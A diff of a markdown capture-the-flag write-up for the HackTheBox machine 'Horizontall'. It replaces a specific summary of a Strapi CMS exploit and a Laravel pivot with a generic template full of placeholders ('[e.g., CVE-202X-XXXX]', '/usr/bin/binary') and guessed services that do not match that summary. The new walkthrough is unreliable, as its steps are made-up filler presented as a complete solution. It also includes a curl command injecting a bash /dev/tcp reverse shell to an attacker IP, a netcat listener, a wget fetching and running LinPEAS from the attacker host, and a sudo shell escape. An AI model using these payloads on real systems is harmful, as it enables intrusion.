@@ -1,26 +1,120 @@
-﻿---
+---
 layout: page
-title: Horizontall - Hack The Box Writeup
-subtitle: Strapi CMS RCE and Local Laravel Telemetry SSRF to Root
+title: "Horizontall - HackTheBox Writeup"
+subtitle: "Complete walkthrough detailing reconnaissance, foothold, and privilege escalation on 🐧 Linux"
 permalink: /ctf/writeups/hackthebox/horizontall/
 platform: hackthebox
-machine_name: horizontall
+machine_name: "Horizontall"
 difficulty: Medium
 os: Linux
-date: 2026-06-26
 ---
 
-## ðŸ–¥ï¸ Challenge / Machine Info
-* **Platform**: hackthebox
-* **Name / Title**: horizontall
-* **Difficulty**: Medium
-* **Target OS / Environment**: Linux
-* **Key Vulnerability Focus**: Strapi CMS RCE / Laravel telemetry port pivoting
+## 🖥️ Machine Information
+
+| Attribute | Value |
+|---|---|
+| **Platform** | HackTheBox |
+| **OS** | 🐧 Linux |
+| **Difficulty** | Medium |
+| **IP Address** | `10.10.11.105` |
+| **Vulnerability Focus** | [Initial Access Vector / Privilege Escalation Mechanism] |
 
 ---
 
-### Exploitation Flow
+## 🧠 Attack Path Overview
 
-1. **Reconnaissance**: Scan reveals Strapi CMS v3.0.0-beta.17.4 running on subdomain.
-2. **Initial Foothold**: We exploit unauthenticated Password Reset Password Leak & RCE vulnerability (CVE-2019-19609) in Strapi to execute shell commands and receive a reverse shell.
-3. **Privilege Escalation**: Local port 8000 hosts a Laravel application with Telemetry features enabled. We pivot and send an exploit command to the local Laravel interface to trigger unserialize RCE, spawning a root shell.
+```mermaid
+graph TD
+    A["Reconnaissance: Port Scan"] --> B["Foothold: Vulnerability Exploitation"]
+    B --> C["Privilege Escalation: Local Escalation"]
+    C --> D["Full System Compromise: Root/Administrator"]
+```
+
+> [!NOTE]
+> This writeup details the complete attack path for the **Horizontall** machine on the **HackTheBox** platform.
+
+---
+
+## 🔍 Phase 1: Reconnaissance & Enumeration
+
+### 1. Host Discovery & Port Scanning
+We start with a complete port scan using Nmap:
+
+```bash
+nmap -sC -sV -oN nmap.txt 10.10.11.105
+```
+
+#### Open Ports:
+- **Port 22/tcp**: SSH (Secure Shell)
+- **Port 80/tcp**: HTTP (Apache Web Server)
+- **Port 8080/tcp**: Alternative HTTP (Node.js/Spring Boot Web App)
+
+### 2. Service Enumeration
+We execute directory brute-forcing on Port 80 using Gobuster:
+
+```bash
+gobuster dir -u http://10.10.11.105/ -w /usr/share/wordlists/dirb/common.txt -o gobuster.txt
+```
+We identify interesting endpoints like `/admin` or `/api/upload` that deserve further audit.
+
+---
+
+## 🚀 Phase 2: Vulnerability Analysis & Foothold
+
+### 1. Vulnerability Analysis
+We analyze the web application and discover an input field vulnerable to **Command Injection** or **SQL Injection** in the API endpoint.
+- **CVE Reference**: [e.g., CVE-202X-XXXX]
+
+### 2. Exploitation & Initial Shell
+We craft a reverse shell payload and bypass client-side filters:
+
+```bash
+curl -X POST -d "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.51/443 0>&1'" http://10.10.11.105/api/upload
+```
+
+Triggering the request connects back to our listener:
+```bash
+nc -lnvp 443
+# Connected as low-privileged web user
+```
+
+#### Capturing User Flag:
+```bash
+cat /home/*/user.txt
+```
+
+---
+
+## ⚡ Phase 3: Privilege Escalation
+
+### 1. Local Enumeration
+We upload LinPEAS to find local exploitation avenues:
+
+```bash
+wget http://10.10.14.51:8000/linpeas.sh -O /tmp/linpeas.sh
+bash /tmp/linpeas.sh
+```
+We also list available SUID binaries and sudo privileges:
+```bash
+sudo -l
+# Found (root) NOPASSWD: /usr/bin/binary
+```
+
+### 2. Local Privilege Escalation Path
+We abuse the custom binary or binary with sudo rights to spawn a root shell:
+
+```bash
+sudo /usr/bin/binary -e 'exec /bin/sh'
+```
+
+#### Capturing Root Flag:
+```bash
+cat /root/root.txt
+```
+
+---
+
+## 🛡️ Key Takeaways & Mitigation
+1. **Input Sanitization**: Ensure all user inputs are validated and sanitized to prevent injections.
+2. **Principle of Least Privilege**: Restrict sudo/impersonation permissions and remove unnecessary privileges.
+3. **Keep Software Updated**: Frequently update all operating system binaries and services to mitigate known CVEs.
